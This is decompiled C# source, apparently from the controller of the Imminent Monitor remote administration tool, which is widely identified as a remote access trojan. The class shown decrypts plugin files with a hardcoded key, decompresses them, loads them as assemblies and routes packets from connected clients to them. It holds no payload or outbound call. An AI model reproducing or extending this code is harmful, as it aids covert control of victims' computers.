// Decompiled with JetBrains decompiler
// Type: Class108
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Imminent;
using Imminent.GUI;
using LZLoader;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[StandardModule]
internal sealed class Class108
{
  private static Class159 class159_0 = new Class159();
  public static List<GClass43> list_0 = new List<GClass43>();
  public static List<GClass43> list_1 = new List<GClass43>();
  private static string string_0 = Application.StartupPath + "\\Plugins\\";
  private static byte[] byte_0 = new byte[99]
  {
    (byte) 79,
    (byte) 250,
    byte.MaxValue,
    (byte) 142,
    (byte) 228,
    (byte) 61,
    (byte) 145,
    (byte) 33,
    (byte) 201,
    (byte) 68,
    (byte) 154,
    (byte) 44,
    (byte) 212,
    (byte) 84,
    (byte) 247,
    (byte) 232,
    (byte) 57,
    (byte) 19,
    (byte) 169,
    (byte) 206,
    (byte) 84,
    (byte) 124,
    (byte) 81,
    (byte) 65,
    (byte) 59,
    (byte) 161,
    (byte) 120,
    (byte) 59,
    (byte) 29,
    (byte) 228,
    (byte) 33,
    (byte) 109,
    (byte) 69,
    (byte) 212,
    (byte) 31,
    (byte) 100,
    (byte) 49,
    (byte) 146,
    (byte) 197,
    (byte) 169,
    (byte) 251,
    (byte) 179,
    (byte) 173,
    (byte) 177,
    (byte) 28,
    (byte) 210,
    (byte) 219,
    (byte) 148,
    (byte) 109,
    (byte) 8,
    (byte) 184,
    (byte) 79,
    (byte) 5,
    (byte) 43,
    (byte) 55,
    (byte) 195,
    (byte) 223,
    (byte) 168,
    (byte) 163,
    (byte) 64,
    (byte) 12,
    (byte) 191,
    (byte) 83,
    (byte) 46,
    (byte) 165,
    (byte) 77,
    (byte) 93,
    (byte) 106,
    (byte) 165,
    (byte) 66,
    (byte) 100,
    (byte) 143,
    (byte) 197,
    (byte) 1,
    (byte) 107,
    (byte) 48,
    (byte) 126,
    (byte) 136,
    (byte) 3,
    (byte) 228,
    (byte) 113,
    (byte) 63,
    (byte) 117,
    (byte) 65,
    (byte) 244,
    (byte) 167,
    (byte) 88,
    (byte) 34,
    (byte) 28,
    (byte) 29,
    (byte) 47,
    (byte) 74,
    (byte) 231,
    (byte) 123,
    (byte) 142,
    (byte) 147,
    (byte) 65,
    (byte) 70,
    (byte) 162
  };

  public static void smethod_0()
  {
    try
    {
      foreach (GClass43 gclass43_0 in new List<GClass43>((IEnumerable<GClass43>) Class108.list_0))
        Class108.smethod_12(gclass43_0);
    }
    finally
    {
      List<GClass43>.Enumerator enumerator;
      enumerator.Dispose();
    }
    Class97.formMain_0.vmethod_10().Controls.Clear();
    Class108.smethod_1();
    Class148.smethod_11();
  }

  public static void smethod_1()
  {
    try
    {
      Class97.gclass2_0.method_0("[System] Loading Plugins...", Class97.gclass2_0.textStyle_2);
      List<GClass43> gclass43List1 = new List<GClass43>();
      gclass43List1.AddRange((IEnumerable<GClass43>) Class108.list_1);
      List<GClass43> gclass43List2 = new List<GClass43>();
      gclass43List2.AddRange((IEnumerable<GClass43>) Class108.list_0);
      try
      {
        foreach (GClass43 gclass43_0 in gclass43List2)
          Class108.smethod_12(gclass43_0);
      }
      finally
      {
        List<GClass43>.Enumerator enumerator;
        enumerator.Dispose();
      }
      try
      {
        foreach (GClass43 gclass43 in gclass43List1)
        {
          Class97.formMain_0.vmethod_10().Controls.Remove((Control) gclass43.method_24());
          Class108.list_1.Remove(gclass43);
        }
      }
      finally
      {
        List<GClass43>.Enumerator enumerator;
        enumerator.Dispose();
      }
      if (Directory.Exists(Class108.string_0))
      {
        string[] files = Directory.GetFiles(Class108.string_0, "*.imp");
        if (files.Length > 0)
        {
          int int_0 = 0;
          foreach (string str1 in files)
          {
            object[] objArray = Class108.smethod_4(File.ReadAllBytes(str1));
            bool bool_3_1 = (bool) objArray[7];
            string string_6_1 = (string) objArray[0];
            string string_6_2 = (string) objArray[1];
            string string_6_3 = (string) objArray[2];
            string string_6_4 = (string) objArray[3];
            Image image_1 = Image.FromStream((Stream) new MemoryStream((byte[]) objArray[4]));
            byte[] rawAssembly = (byte[]) objArray[5];
            byte[] byte_1;
            if (!bool_3_1)
              byte_1 = (byte[]) objArray[6];
            string str2 = (string) objArray[8];
            Assembly assembly_1 = Assembly.Load(rawAssembly);
            bool bool_3_2 = Class108.smethod_2(str2);
            GClass43 gclass43 = new GClass43();
            gclass43.method_1(string_6_1);
            gclass43.method_3(str2);
            gclass43.method_7(string_6_2);
            gclass43.method_5(string_6_3);
            gclass43.method_11(image_1);
            gclass43.method_13(byte_1);
            gclass43.method_21(assembly_1);
            gclass43.method_9(string_6_4);
            gclass43.method_23(bool_3_1);
            gclass43.method_27(str1);
            gclass43.method_29(bool_3_2);
            GClass43 gclass43_0 = gclass43;
            UserControl userControl_1 = Class108.smethod_3(gclass43_0, int_0);
            gclass43_0.method_25(userControl_1);
            Class108.list_1.Add(gclass43_0);
            ++int_0;
          }
        }
      }
      Class97.gclass2_0.method_0("[System] Plugins Loaded.", Class97.gclass2_0.textStyle_1);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  public static bool smethod_2(string string_1) => Operators.CompareString(string_1, "ee814d75-9ff9-4633-8934-fe08a51a9c7e", false) == 0 | Operators.CompareString(string_1, "d0ff4774-f9b9-496a-b84a-41a869d88a5e", false) == 0;

  public static UserControl smethod_3(GClass43 gclass43_0, int int_0)
  {
    UserControlPluginItem userControl_0 = new UserControlPluginItem(gclass43_0);
    userControl_0.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
    userControl_0.AutoScaleMode = AutoScaleMode.Font;
    userControl_0.AutoScroll = false;
    userControl_0.Width = Class97.formMain_0.vmethod_6().Size.Width;
    if (int_0 > 0)
      userControl_0.Location = new Point(0, userControl_0.Height * int_0);
    if (Class108.list_0.Contains(gclass43_0))
      userControl_0.vmethod_2().Checked = true;
    Class97.formMain_0.vmethod_10().Controls.Add((Control) userControl_0);
    Class97.smethod_12((UserControl) userControl_0);
    return (UserControl) userControl_0;
  }

  public static object[] smethod_4(byte[] byte_1)
  {
    RuntimeHelpers.GetObjectValue(new object());
    byte_1 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_0(byte_1, Class108.byte_0);
    byte_1 = Load.Decompress(byte_1, 0U);
    return Class108.class159_0.method_2(byte_1);
  }

  private static IServerMain smethod_5(Assembly assembly_0, GClass8 gclass8_0, GClass36 gclass36_0)
  {
    foreach (System.Type type in assembly_0.GetTypes())
    {
      ConstructorInfo[] constructors = type.GetConstructors();
      if (constructors.Length != 0)
      {
        ParameterInfo[] parameters = constructors[0].GetParameters();
        if (parameters.Length != 0)
        {
          System.Type parameterType = parameters[0].ParameterType;
          if ((object) typeof (IServerNetworkActions) == (object) parameterType | (object) typeof (IServerGUI) == (object) parameterType)
          {
            object[] objArray = new object[2]
            {
              (object) gclass8_0,
              (object) gclass36_0
            };
            return (IServerMain) Activator.CreateInstance(type, objArray);
          }
        }
      }
    }
    return (IServerMain) null;
  }

  public static void smethod_6(bool bool_0, GClass18 gclass18_0)
  {
    int num = Class108.list_0.Count - 1;
    for (int index = 0; index <= num; ++index)
    {
      if (!Class108.list_0[index].method_22())
        Class108.list_0[index].method_14().IClientConnectedStateChanged(bool_0, gclass18_0.method_22());
    }
  }

  public static void smethod_7(GClass18 gclass18_0, string string_1, object[] object_0)
  {
    try
    {
      foreach (GClass43 gclass43 in Class108.list_0)
      {
        if (!gclass43.method_22() && Operators.CompareString(gclass43.method_2(), string_1, false) == 0)
          gclass43.method_14().IClientPacketReceived(gclass18_0.method_22(), object_0);
      }
    }
    finally
    {
      List<GClass43>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  public static T[] smethod_8<T>(T[] gparam_0, int int_0)
  {
    int upperBound = gparam_0.GetUpperBound(0);
    int lowerBound = gparam_0.GetLowerBound(0);
    int num = upperBound - lowerBound;
    if (int_0 < lowerBound || int_0 > upperBound)
      throw new ArgumentOutOfRangeException(string.Format("Index must be from {0} to {1}.", (object) lowerBound, (object) upperBound));
    T[] destinationArray = new T[num - 1 + 1];
    Array.Copy((Array) gparam_0, 0, (Array) destinationArray, 0, int_0);
    Array.Copy((Array) gparam_0, int_0 + 1, (Array) destinationArray, int_0, upperBound - int_0);
    return destinationArray;
  }

  public static ToolStripMenuItem smethod_9(ToolStripMenuItem toolStripMenuItem_0)
  {
    string text = toolStripMenuItem_0.OwnerItem.Text;
    if (Operators.CompareString(text, "Administration", false) == 0)
      return Class97.formMain_0.vmethod_0().vmethod_4();
    if (Operators.CompareString(text, "Client", false) == 0)
      return Class97.formMain_0.vmethod_0().vmethod_10();
    return Operators.CompareString(text, "User Support", false) == 0 ? Class97.formMain_0.vmethod_0().vmethod_32() : (ToolStripMenuItem) null;
  }

  public static bool smethod_10(ToolStripMenuItem toolStripMenuItem_0)
  {
    if (toolStripMenuItem_0.OwnerItem == null)
    {
      string text = toolStripMenuItem_0.Text;
      return Operators.CompareString(text, "Administration", false) != 0 && Operators.CompareString(text, "Client", false) != 0 && Operators.CompareString(text, "User Support", false) != 0 && Operators.CompareString(text, "Monitoring", false) != 0;
    }
    string text1 = toolStripMenuItem_0.OwnerItem.Text;
    return Operators.CompareString(text1, "Administration", false) != 0 && Operators.CompareString(text1, "Client", false) != 0 && Operators.CompareString(text1, "User Support", false) != 0 && Operators.CompareString(text1, "Monitoring", false) != 0;
  }

  public static void smethod_11(GClass43 gclass43_0)
  {
    if (gclass43_0.bool_0)
      return;
    GClass8 gclass8_1 = new GClass8();
    GClass36 gclass36_1 = new GClass36();
    gclass8_1.string_0 = gclass43_0.method_2();
    gclass43_0.method_17(gclass8_1);
    gclass43_0.method_19(gclass36_1);
    IServerMain iserverMain_1 = Class108.smethod_5(gclass43_0.method_20(), gclass43_0.method_16(), gclass43_0.method_18());
    gclass43_0.method_15(iserverMain_1);
    Class108.list_0.Add(gclass43_0);
    if (!gclass43_0.method_22())
    {
      List<GClass18> gclass18List = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_10();
      try
      {
        foreach (GClass18 gclass18_0 in gclass18List)
          Class90.smethod_0(gclass18_0, gclass43_0);
      }
      finally
      {
        List<GClass18>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }
    gclass43_0.bool_0 = true;
    Class108.smethod_13(gclass43_0);
    Class97.gclass2_0.method_0("[System] Plugin Loaded: " + gclass43_0.method_0(), Class97.gclass2_0.textStyle_0);
  }

  public static void smethod_12(GClass43 gclass43_0)
  {
    if (!gclass43_0.bool_0)
      return;
    gclass43_0.bool_0 = false;
    try
    {
      foreach (ToolStripMenuItem toolStripMenuItem_0 in gclass43_0.method_18().list_0)
      {
        if (Class108.smethod_10(toolStripMenuItem_0))
          Class97.formMain_0.vmethod_0().vmethod_0().Items.Remove((ToolStripItem) toolStripMenuItem_0);
      }
    }
    finally
    {
      List<ToolStripMenuItem>.Enumerator enumerator;
      enumerator.Dispose();
    }
    try
    {
      foreach (ToolStripMenuItem toolStripMenuItem_0 in gclass43_0.method_18().list_1)
      {
        if (Class108.smethod_9(toolStripMenuItem_0) != null)
          Class108.smethod_9(toolStripMenuItem_0).DropDownItems.Remove((ToolStripItem) toolStripMenuItem_0);
      }
    }
    finally
    {
      List<ToolStripMenuItem>.Enumerator enumerator;
      enumerator.Dispose();
    }
    try
    {
      foreach (TabPage tabPage in gclass43_0.method_18().list_2)
        ;
    }
    finally
    {
      List<TabPage>.Enumerator enumerator;
      enumerator.Dispose();
    }
    Class108.list_0.Remove(gclass43_0);
    if (!gclass43_0.method_22())
    {
      try
      {
        foreach (GClass18 gclass18_0 in dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_10())
          Class90.smethod_1(gclass18_0, gclass43_0);
      }
      finally
      {
        List<GClass18>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }
    gclass43_0.method_14().Unload();
    Class97.gclass2_0.method_0("[System] Plugin Unloaded: " + gclass43_0.method_0(), Class97.gclass2_0.textStyle_0);
  }

  private static void smethod_13(GClass43 gclass43_0)
  {
    try
    {
      foreach (Control control in gclass43_0.method_24().Controls)
      {
        if (control is CheckBox)
          ((CheckBox) control).Checked = true;
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }
}
